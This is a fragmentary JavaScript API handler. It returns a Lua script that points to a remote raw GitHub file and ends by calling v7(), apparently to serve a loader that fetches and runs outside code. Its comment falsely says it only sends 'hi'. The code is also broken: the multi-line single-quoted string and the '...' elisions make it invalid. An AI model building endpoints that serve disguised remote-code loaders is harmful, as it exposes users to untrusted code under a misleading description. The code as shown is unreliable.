export default function handler(req, res) {
  ...
  res.status(200).send('local v1 = "https://raw.githubusercontent.com/ShexYt/kabuchalacaca/refs/heads/main/bitches.lua.txt"
...
v7()'); // Just send 'hi' without anything else
}
